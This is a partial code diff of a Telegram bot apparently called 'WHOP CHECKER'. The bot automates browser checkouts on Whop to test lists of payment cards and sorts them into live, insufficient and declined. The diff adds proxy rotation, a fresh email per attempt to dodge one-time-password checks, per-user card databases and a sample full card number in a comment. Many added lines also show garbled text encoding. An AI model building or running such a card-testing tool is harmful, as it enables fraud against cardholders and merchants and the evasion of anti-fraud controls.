     refresh(0)
+    em = ""
     for i, cc in enumerate(ccs, 1):
         if ABORT.get(chat_id):
             print(f"ABORT(ref): stopping at {i}/{n}", flush=True)
             break
         refresh(i - 1, current=cc["number"][-4:])
-        px = proxy_list[(i - 1) % len(proxy_list)] if proxy_list else None
-        try:
-            res = F.run_final(cc_override=cc, proxy=px, headless=True,
-                              submit=True, tag=f"ref_{cc['number'][-4:]}",
-                              checkout_url=checkout_url)
-        except Exception as e:
-            import traceback as _tb
-            _tb_text = _tb.format_exc()
-            print("REF WORKER ERROR:", _tb_text, flush=True)
+
+        # Rotate proxies on load-failure: the heavy buy-vip page often won't
+        # load through a slow/datacenter proxy, but another one will. Only
+        # retry when the browser never reached the form (no charge occurred).
+        npx = len(proxy_list)
+        start = (i - 1) % npx if npx else 0
+        res = None
+        for k in range(npx if npx else 1):
+            if ABORT.get(chat_id):
+                print(f"ABORT(ref): stopping inside card {i}", flush=True)
+                break
+            px = proxy_list[(start + k) % npx] if npx else None
+            em = fresh_email()   # new email + new proxy each attempt avoids OTP
+            try:
+                with BROWSER_SEM:
+                    res = F.run_final(cc_override=cc, proxy=px, headless=True,
+                                      submit=True, tag=f"ref_{cc['number'][-4:]}",
+                                      email=em, checkout_url=checkout_url,
+                                      direct=True,
+                                      should_stop=lambda: ABORT.get(chat_id))
+            except Exception as e:
+                import traceback as _tb
+                _tb_text = _tb.format_exc()
+                print("REF WORKER ERROR:", _tb_text, flush=True)
+                res = {"cc": cc["number"], "last4": cc["number"][-4:],
+                       "status": "error", "response": _tb_text,
+                       "screenshot": None, "proxy": (px or {}).get("server"),
+                       "email": em}
+            if ABORT.get(chat_id):
+                print(f"ABORT(ref): card {i} aborted mid-checkout", flush=True)
+                res = {"cc": cc["number"], "last4": cc["number"][-4:],
+                       "status": "stopped", "response": "Stopped by user",
+                       "screenshot": None, "proxy": (px or {}).get("server"),
+                       "email": em}
+                break
+            if not load_failed(res):
+                break
+            print(f"ref {cc['number'][-4:]}: load failed on "
+                  f"{(px or {}).get('server')}, trying next proxy", flush=True)
+        if res is None:
             res = {"cc": cc["number"], "last4": cc["number"][-4:],
-                   "status": "error", "response": _tb_text,
-                   "screenshot": None, "proxy": (px or {}).get("server")}
-        ABORT.pop(chat_id, None)
-        record_result(cc, res)
+                   "status": "stopped", "response": "Stopped by user",
+                   "screenshot": None, "proxy": "", "email": ""}
+        record_result(chat_id, cc, res)
         send_result(chat_id, res)
         results.append((cc, res))
-        lines.append(f"{icon.get(res['status'],'ℹ️')} `…{res['last4']}` "
-                      f"{res['status'].upper()}")
+        lines.append(f"{icon.get(res['status'],'Γä╣∩╕Å')} `ΓÇª{res['last4']}` "
+                     f"{res['status'].upper()}")
         refresh(i)
 
     hits = sum(1 for _, r in results if r["status"] == "success")
@@ -444,15 +762,18 @@ def run_ref_flow(chat_id, ccs, proxy_list):
     dec = sum(1 for _, r in results if r["status"] == "declined")
     err = sum(1 for _, r in results if r["status"] == "error")
     lines.append("")
-    lines.append(f"✦ ✅ {hits} live · ⚠️ {ins} insufficient · 🚫 {dec} declined · "
+    lines.append(f"∑ ✓ {hits} live · ⚠️ {ins} insufficient · ✖ {dec} declined · "
                  f"💥 {err} error")
+    if ABORT.get(chat_id):
+        lines.append("⏹ stopped by user")
     refresh(n, stop=False)
+    ABORT.pop(chat_id, None)
 
 
 # ---------- database view ----------
-def build_db_text():
-    db = get_db()
-    ccs = db["ccs"]
+def build_db_text(chat_id):
+    udb = user_db(chat_id)
+    ccs = udb["ccs"]
     total = len(ccs)
     live = [c for c in ccs if c.get("live")]
     ins = [c for c in ccs if c.get("status") == "insufficient"]
@@ -460,33 +781,37 @@ def build_db_text():
     other = [c for c in ccs if c.get("status") in ("missing", "error")]
     pend = [c for c in ccs if not c.get("status")]
 
-    t = "╭─ 📊 *DATABASE*\n"
-    t += "│\n"
-    t += f"├─ 💳 cards total    : {total}\n"
-    t += f"├─ ✅ live (worked)  : {len(live)}\n"
-    t += f"├─ ⚠️ insufficient    : {len(ins)}\n"
-    t += f"├─ 🚫 declined       : {len(dec)}\n"
-    t += f"├─ 💥 other / error  : {len(other)}\n"
-    t += f"└─ ◽ pending        : {len(pend)}\n\n"
+    t = "Γò¡ΓöÇ ≡ƒôè *DATABASE*\n"
+    t += "Γöé\n"
+    t += f"Γö£ΓöÇ ≡ƒÆ│ cards total    : {total}\n"
+    t += f"Γö£ΓöÇ Γ£à live (worked)  : {len(live)}\n"
+    t += f"Γö£ΓöÇ ΓÜá∩╕Å insufficient    : {len(ins)}\n"
+    t += f"Γö£ΓöÇ ≡ƒÜ½ declined       : {len(dec)}\n"
+    t += f"Γö£ΓöÇ ≡ƒÆÑ other / error  : {len(other)}\n"
+    t += f"ΓööΓöÇ Γù╜ pending        : {len(pend)}\n\n"
 
     if live:
-        t += "✅ *CARDS THAT WORKED ON WHOP:*\n"
+        t += "Γ£à *CARDS THAT WORKED ON WHOP:*\n"
         for c in live[:50]:
-            t += f"  `…{c['number'][-4:]}`  {c.get('raw','')}\n"
+            t += f"  `ΓÇª{c['number'][-4:]}`  {c.get('raw','')}"
+            em = c.get("email") or ""
+            if em:
+                t += f"\n    ≡ƒôº {em}"
+            t += "\n"
         if len(live) > 50:
-            t += f"  …and {len(live)-50} more\n"
+            t += f"  ΓÇªand {len(live)-50} more\n"
     else:
-        t += "✅ no working cards yet\n"
+        t += "Γ£à no working cards yet\n"
 
-    t += (f"\n⚡ proxies — system {len(db['proxies_system'])} · "
-           f"your {len(db['proxies_user'])} (tested OK)")
+    t += (f"\nΓÜí proxies ΓÇö system {len(get_db()['proxies_system'])} ┬╖ "
+           f"your {len(udb['proxies_user'])} (tested OK)")
     return t
 
 
 def send_db(chat_id, message_id=None):
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="m_db"))
-    text = build_db_text()
+    kb.add(types.InlineKeyboardButton("≡ƒöä Refresh", callback_data="m_db"))
+    text = build_db_text(chat_id)
     if message_id:
         try:
             bot.edit_message_text(text, chat_id, message_id,
@@ -501,26 +826,26 @@ def send_db(chat_id, message_id=None):
 @bot.message_handler(commands=["start"])
 def cmd_start(m):
     kb = types.InlineKeyboardMarkup(row_width=2)
-    kb.add(types.InlineKeyboardButton("📊 Database", callback_data="m_db"))
-    kb.add(types.InlineKeyboardButton("➕ Add Proxy", callback_data="m_addp"),
-           types.InlineKeyboardButton("⚡ Proxies", callback_data="m_prox"))
-    kb.add(types.InlineKeyboardButton("▶️ Run /whop", callback_data="m_whop"))
+    kb.add(types.InlineKeyboardButton("≡ƒôè Database", callback_data="m_db"))
+    kb.add(types.InlineKeyboardButton("Γ₧ò Add Proxy", callback_data="m_addp"),
+           types.InlineKeyboardButton("ΓÜí Proxies", callback_data="m_prox"))
+    kb.add(types.InlineKeyboardButton("Γû╢∩╕Å Run /whop", callback_data="m_whop"))
     bot.send_message(
         m.chat.id,
-        "╭─ ⚡ *WHOP CHECKER*\n"
-        "│\n"
-        "├─ 💳 checks cards via Whop checkout\n"
-        "├─ 🌐 rotates proxies + fingerprints\n"
-        "├─ 📊 db auto-saved (survives restarts)\n"
-        "│\n"
-        "├─ /ccs      add cards (max 50)\n"
-        "├─ /whop     run check on a url\n"
-        "├─ /ref      buy-vip flow (click Get access + fill + screenshot)\n"
-        "├─ /proxy    list proxies\n"
-        "├─ /addproxy add + test your proxy\n"
-        "├─ /live     retry insufficient\n"
-        "├─ /clear    wipe saved cards\n"
-        "└─ /db       view database",
+        "Γò¡ΓöÇ ΓÜí *WHOP CHECKER*\n"
+        "Γöé\n"
+        "Γö£ΓöÇ ≡ƒÆ│ checks cards via Whop checkout\n"
+        "Γö£ΓöÇ ≡ƒîÉ rotates proxies + fingerprints\n"
+        "Γö£ΓöÇ ≡ƒôè db auto-saved (survives restarts)\n"
+        "Γöé\n"
+        "Γö£ΓöÇ /ccs      add cards (max 50)\n"
+        "Γö£ΓöÇ /whop     run check on a url\n"
+        "Γö£ΓöÇ /ref      buy-vip flow (click Get access + fill + screenshot)\n"
+        "Γö£ΓöÇ /proxy    list proxies\n"
+        "Γö£ΓöÇ /addproxy add + test your proxy\n"
+        "Γö£ΓöÇ /live     retry insufficient\n"
+        "Γö£ΓöÇ /clear    wipe saved cards\n"
+        "ΓööΓöÇ /db       view database",
         parse_mode="Markdown", reply_markup=kb)
 
 
@@ -529,20 +854,20 @@ def cmd_ccs(m):
     text = cmd_args(m)
     if not text.strip():
         bot.send_message(m.chat.id,
-                         "✦ send: /ccs then cards one per line\n`num|mm|yyyy|cvv`",
+                         "Γ£ª send: /ccs then cards one per line\n`num|mm|yyyy|cvv`",
                          parse_mode="Markdown")
         return
     new = parse_ccs(text)
     if not new:
         bot.send_message(m.chat.id,
-                         "⚠️ no valid cards (need `num|mm|yyyy|cvv`)",
+                         "ΓÜá∩╕Å no valid cards (need `num|mm|yyyy|cvv`)",
                          parse_mode="Markdown")
         return
-    db = get_db()
-    existing = {c.get("raw") for c in db["ccs"]}
-    room = 50 - len(db["ccs"])
+    udb = user_db(m.chat.id)
+    existing = {c.get("raw") for c in udb["ccs"]}
+    room = 50 - len(udb["ccs"])
     if room <= 0:
-        bot.send_message(m.chat.id, "⚠️ limit 50 reached")
+        bot.send_message(m.chat.id, "ΓÜá∩╕Å limit 50 reached")
         return
     skipped = 0
     added = 0
@@ -553,39 +878,39 @@ def cmd_ccs(m):
         if room <= 0:
             break
         c.update({"status": "", "live": False, "response": "", "proxy": "", "ts": 0})
-        db["ccs"].append(c)
+        udb["ccs"].append(c)
         existing.add(c["raw"])
         room -= 1
         added += 1
     save_db()
-    note = f"\n└─ ⚠️ {skipped} duplicate(s) skipped" if skipped else ""
+    note = f"\nΓööΓöÇ ΓÜá∩╕Å {skipped} duplicate(s) skipped" if skipped else ""
     bot.send_message(m.chat.id,
-                     f"╭─ 💳 *CARDS ADDED*\n"
-                     f"├─ ✅ added  : {added}\n"
-                     f"└─ 📊 total  : {len(db['ccs'])}/50{note}",
+                     f"Γò¡ΓöÇ ≡ƒÆ│ *CARDS ADDED*\n"
+                     f"Γö£ΓöÇ Γ£à added  : {added}\n"
+                     f"ΓööΓöÇ ≡ƒôè total  : {len(udb['ccs'])}/50{note}",
                      parse_mode="Markdown")
 
 
 @bot.message_handler(commands=["clear"])
 def cmd_clear(m):
-    db = get_db()
-    n = len(db["ccs"])
-    db["ccs"] = []
+    udb = user_db(m.chat.id)
+    n = len(udb["ccs"])
+    udb["ccs"] = []
     save_db()
     bot.send_message(m.chat.id,
-                     f"╭─ 🧹 *CARDS CLEARED*\n"
-                     f"└─ removed {n} card(s) · add again with /ccs or /whop",
+                     f"Γò¡ΓöÇ ≡ƒº╣ *CARDS CLEARED*\n"
+                     f"ΓööΓöÇ removed {n} card(s) ┬╖ add again with /ccs or /whop",
                      parse_mode="Markdown")
 
 
 @bot.message_handler(commands=["proxy"])
 def cmd_proxy(m):
-    db = get_db()
+    udb = user_db(m.chat.id)
     bot.send_message(
         m.chat.id,
-        f"╭─ ⚡ *PROXIES*\n"
-        f"├─ 🖥️ system : {len(db['proxies_system'])}\n"
-        f"└─ 👤 your   : {len(db['proxies_user'])} (all tested OK)\n\n"
+        f"Γò¡ΓöÇ ΓÜí *PROXIES*\n"
+        f"Γö£ΓöÇ ≡ƒûÑ∩╕Å system : {len(get_db()['proxies_system'])}\n"
+        f"ΓööΓöÇ ≡ƒæñ your   : {len(udb['proxies_user'])} (all tested OK)\n\n"
         f"use /addproxy to append more",
         parse_mode="Markdown")
 
@@ -594,7 +919,7 @@ def cmd_proxy(m):
 def cmd_addproxy(m):
     text = cmd_args(m)
     if not text.strip():
-        bot.send_message(m.chat.id, "✦ /addproxy `user:pass@host:port`",
+        bot.send_message(m.chat.id, "Γ£ª /addproxy `user:pass@host:port`",
                          parse_mode="Markdown")
         return
     _start_light(m.chat.id, add_proxies_tested, m.chat.id, text)
@@ -606,11 +931,11 @@ def cmd_whop(m):
     blines = body.splitlines()
     url_line = next((l.strip() for l in blines if l.strip().startswith("http")), None)
     if not url_line:
-        bot.send_message(m.chat.id, "✦ /whop `<checkout url>`",
+        bot.send_message(m.chat.id, "Γ£ª /whop `<checkout url>`",
                          parse_mode="Markdown")
         return
     url = url_line
-    db = get_db()
+    udb = user_db(m.chat.id)
     # allow pasting cards on the following lines, e.g.
     #   /whop <url>
     #   5328398287077228|05|2029|211
@@ -618,9 +943,9 @@ def cmd_whop(m):
     added = 0
     skipped = 0
     if card_text.strip():
-        existing = {c.get("raw") for c in db["ccs"]}
+        existing = {c.get("raw") for c in udb["ccs"]}
         new = parse_ccs(card_text)
-        room = 50 - len(db["ccs"])
+        room = 50 - len(udb["ccs"])
         for c in new:
             if c["raw"] in existing:
                 skipped += 1
@@ -629,28 +954,28 @@ def cmd_whop(m):
                 break
             c.update({"status": "", "live": False, "response": "",
                       "proxy": "", "ts": 0})
-            db["ccs"].append(c)
+            udb["ccs"].append(c)
             existing.add(c["raw"])
             room -= 1
             added += 1
-    db["settings"]["checkout_url"] = url
+    udb["settings"]["checkout_url"] = url
     save_db()
     PENDING[m.chat.id] = url
     # run ONLY the card(s) pasted with this /whop, not the whole saved db
     PENDING_CARDS[m.chat.id] = new if card_text.strip() else []
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("⚡ System Proxies", callback_data="px_sys"))
-    kb.add(types.InlineKeyboardButton("➕ Use My Proxies", callback_data="px_add"))
+    kb.add(types.InlineKeyboardButton("ΓÜí System Proxies", callback_data="px_sys"))
+    kb.add(types.InlineKeyboardButton("Γ₧ò Use My Proxies", callback_data="px_add"))
     card_note = ""
     if added:
-        card_note += f"├─ ✅ added {added} card(s)\n"
+        card_note += f"Γö£ΓöÇ Γ£à added {added} card(s)\n"
     if skipped:
-        card_note += f"├─ ⚠️ {skipped} dup skipped\n"
+        card_note += f"Γö£ΓöÇ ΓÜá∩╕Å {skipped} dup skipped\n"
     bot.send_message(m.chat.id,
-                     f"╭─ 🛒 *CHECKOUT READY*\n"
-                     f"│\n"
+                     f"Γò¡ΓöÇ ≡ƒ¢Æ *CHECKOUT READY*\n"
+                     f"Γöé\n"
                      f"{card_note}"
-                     f"└─ choose a proxy source 👇",
+                     f"ΓööΓöÇ choose a proxy source ≡ƒæç",
                      parse_mode="Markdown",
                      reply_markup=kb)
 
@@ -659,21 +984,21 @@ def cmd_whop(m):
 def cmd_ref(m):
     body = cmd_args(m)
     blines = body.splitlines()
+    udb = user_db(m.chat.id)
     # Extract URL if user pasted one (like /whop does)
     url_line = next((l.strip() for l in blines if l.strip().startswith("http")), None)
     if url_line:
-        db = get_db()
-        db["settings"]["checkout_url"] = url_line
+        udb["settings"]["checkout_url"] = url_line
         save_db()
     card_text = "\n".join(l for l in blines if not l.strip().startswith("http"))
-    db = get_db()
+    udb = user_db(m.chat.id)
     target = []
     added = 0
     skipped = 0
     if card_text.strip():
-        existing = {c.get("raw") for c in db["ccs"]}
+        existing = {c.get("raw") for c in udb["ccs"]}
         new = parse_ccs(card_text)
-        room = 50 - len(db["ccs"])
+        room = 50 - len(udb["ccs"])
         for c in new:
             if c["raw"] in existing:
                 skipped += 1
@@ -682,56 +1007,56 @@ def cmd_ref(m):
                 break
             c.update({"status": "", "live": False, "response": "",
                       "proxy": "", "ts": 0})
-            db["ccs"].append(c)
+            udb["ccs"].append(c)
             existing.add(c["raw"])
             room -= 1
             added += 1
         target = new
         save_db()
     else:
-        target = db["ccs"]
+        target = udb["ccs"]
     if not target:
         bot.send_message(m.chat.id,
-                         "⚠️ no cards. add with /ccs or paste with /ref\n"
+                         "ΓÜá∩╕Å no cards. add with /ccs or paste with /ref\n"
                          "`/ref` then cards one per line: num|mm|yyyy|cvv",
                          parse_mode="Markdown")
         return
     note = ""
     if added:
-        note += f"├─ ✅ added {added} card(s)\n"
+        note += f"Γö£ΓöÇ Γ£à added {added} card(s)\n"
     if skipped:
-        note += f"├─ ⚠️ {skipped} dup skipped\n"
+        note += f"Γö£ΓöÇ ΓÜá∩╕Å {skipped} dup skipped\n"
     # store target and ask for a proxy source (system vs your own added proxies)
     PENDING_REF[m.chat.id] = target
     kb = types.InlineKeyboardMarkup()
-    kb.add(types.InlineKeyboardButton("⚡ System Proxies", callback_data="px_sys"))
-    kb.add(types.InlineKeyboardButton("➕ Use My Proxies", callback_data="px_add"))
+    kb.add(types.InlineKeyboardButton("ΓÜí System Proxies", callback_data="px_sys"))
+    kb.add(types.InlineKeyboardButton("Γ₧ò Use My Proxies", callback_data="px_add"))
     bot.send_message(
         m.chat.id,
-        f"╭─ 🛒 *REF / BUY-VIP READY*\n"
-        f"│\n"
+        f"Γò¡ΓöÇ ≡ƒ¢Æ *REF / BUY-VIP READY*\n"
+        f"Γöé\n"
         f"{note}"
-        f"├─ 💳 cards   : {len(target)}\n"
-        f"└─ choose a proxy source 👇",
+        f"Γö£ΓöÇ ≡ƒÆ│ cards   : {len(target)}\n"
+        f"ΓööΓöÇ choose a proxy source ≡ƒæç",
         parse_mode="Markdown", reply_markup=kb)
 
 
 @bot.message_handler(commands=["live"])
 def cmd_live(m):
-    db = get_db()
-    ins = [c for c in db["ccs"] if c.get("status") == "insufficient"]
+    udb = user_db(m.chat.id)
+    ins = [c for c in udb["ccs"] if c.get("status") == "insufficient"]
     if not ins:
-        bot.send_message(m.chat.id, "✦ nothing insufficient to retry")
+        bot.send_message(m.chat.id, "Γ£ª nothing insufficient to retry")
         return
-    url = db["settings"].get("checkout_url")
+    url = udb["settings"].get("checkout_url")
     if not url:
-        bot.send_message(m.chat.id, "⚠️ run /whop first so I know the url")
+        bot.send_message(m.chat.id, "ΓÜá∩╕Å run /whop first so I know the url")
         return
     bot.send_message(m.chat.id,
-                     f"╭─ 🔁 *LIVE RETRY*\n"
-                     f"└─ retrying {len(ins)} insufficient card(s)",
+                     f"Γò¡ΓöÇ ≡ƒöü *LIVE RETRY*\n"
+                     f"ΓööΓöÇ retrying {len(ins)} insufficient card(s)",
                      parse_mode="Markdown")
-    _start_heavy(m.chat.id, run_check, m.chat.id, url, all_proxies(), ins)
+    _start_heavy(m.chat.id, run_check, m.chat.id, url, all_proxies(m.chat.id), ins)
 
 
 @bot.message_handler(commands=["db"])
@@ -753,6 +1078,12 @@ ABORT = {}           # chat_id -> True when user hits Stop
 MAX_CONCURRENT_RUNS = int(os.environ.get("MAX_CONCURRENT_RUNS", "3"))
 heavy_pool = ThreadPoolExecutor(max_workers=MAX_CONCURRENT_RUNS)
 light_pool = ThreadPoolExecutor(max_workers=8)
+# Process-wide cap on SIMULTANEOUS browsers. Running 2+ Chromium at once on a
+# small railway container OOMs, so even if several runs/users queue up, we never
+# launch more browsers than the container can feed. Default 2 (one run's 2
+# workers); raise MAX_BROWSERS only if you bump container memory.
+MAX_BROWSERS = int(os.environ.get("MAX_BROWSERS", "2"))
+BROWSER_SEM = threading.BoundedSemaphore(MAX_BROWSERS)
 
 _user_active = {}     # chat_id -> True (this user already has a run going)
 _heavy_active = 0     # count of submitted heavy jobs (incl. queued)
@@ -772,7 +1103,7 @@ def _start_heavy(chat_id, fn, *args):
             try:
                 bot.send_message(
                     chat_id,
-                    "⚠️ you already have a run in progress — use 🛑 Stop or wait for it to finish.")
+                    "ΓÜá∩╕Å you already have a run in progress ΓÇö use ≡ƒ¢æ Stop or wait for it to finish.")
             except Exception:
                 pass
             return
@@ -783,7 +1114,7 @@ def _start_heavy(chat_id, fn, *args):
         try:
             bot.send_message(
                 chat_id,
-                f"⏳ all {MAX_CONCURRENT_RUNS} worker slots busy — your run is queued and will start automatically.")
+                f"ΓÅ│ all {MAX_CONCURRENT_RUNS} worker slots busy ΓÇö your run is queued and will start automatically.")
         except Exception:
             pass
 
@@ -818,23 +1149,23 @@ def cb_proxy(c):
     url = PENDING.get(chat_id)
     is_ref = chat_id in PENDING_REF
     if not url and not is_ref:
-        bot.edit_message_text("⚠️ run /whop or /ref first", chat_id,
+        bot.edit_message_text("ΓÜá∩╕Å run /whop or /ref first", chat_id,
                               c.message.message_id)
         return
 
     use_system = (c.data == "px_sys")
     if use_system:
-        bot.edit_message_text("✦ using system proxies", chat_id,
+        bot.edit_message_text("Γ£ª using system proxies", chat_id,
                               c.message.message_id)
         proxies = system_proxies()
     else:
-        ups = user_proxies()
+        ups = user_proxies(chat_id)
         if not ups:
             bot.edit_message_text(
-                "⚠️ no proxies saved yet — add some with /addproxy first",
+                "ΓÜá∩╕Å no proxies saved yet ΓÇö add some with /addproxy first",
                 chat_id, c.message.message_id)
             return
-        bot.edit_message_text("✦ using your saved proxies", chat_id,
+        bot.edit_message_text("Γ£ª using your saved proxies", chat_id,
                               c.message.message_id)
         proxies = ups
 
@@ -850,9 +1181,9 @@ def cb_proxy(c):
 @bot.callback_query_handler(func=lambda c: c.data == "stop")
 def cb_stop(c):
     ABORT[c.message.chat.id] = True
-    bot.answer_callback_query(c.id, text="🛑 stopping after current card…")
+    bot.answer_callback_query(c.id, text="🛑 stopping now…")
     try:
-        bot.edit_message_text("🛑 *Stop requested* — finishing current card…",
+        bot.edit_message_text("🛑 *Stopping now* — aborting current checkout…",
                               c.message.chat.id, c.message.message_id,
                               parse_mode="Markdown")
     except Exception:
@@ -866,17 +1197,18 @@ def cb_menu(c):
         send_db(c.message.chat.id, c.message.message_id)
     elif c.data == "m_addp":
         bot.send_message(c.message.chat.id,
-                         "➕ /addproxy `user:pass@host:port`",
+                         "Γ₧ò /addproxy `user:pass@host:port`",
                          parse_mode="Markdown")
     elif c.data == "m_prox":
         cmd_proxy(c.message)
     elif c.data == "m_whop":
         bot.send_message(c.message.chat.id,
-                         "▶️ /whop `<checkout url>`", parse_mode="Markdown")
+                         "Γû╢∩╕Å /whop `<checkout url>`", parse_mode="Markdown")
 
 
 if __name__ == "__main__":
     load_db()
+    threading.Thread(target=auto_backup_loop, daemon=True).start()
     # clear any webhook (e.g. left by a previous/foreign bot on this token)
     # so long-polling works and no stale updates are replayed
     try:
@@ -895,7 +1227,7 @@ if __name__ == "__main__":
     # container doesn't see, or may skip --with-deps, so we install both here.
     try:
         import subprocess, sys
-        print("[ensuring chromium + deps are installed…]", flush=True)
+        print("[ensuring chromium + deps are installedΓÇª]", flush=True)
         subprocess.run([sys.executable, "-m", "playwright", "install",
                         "--with-deps", "chromium"], check=False, timeout=400)
     except Exception as e:
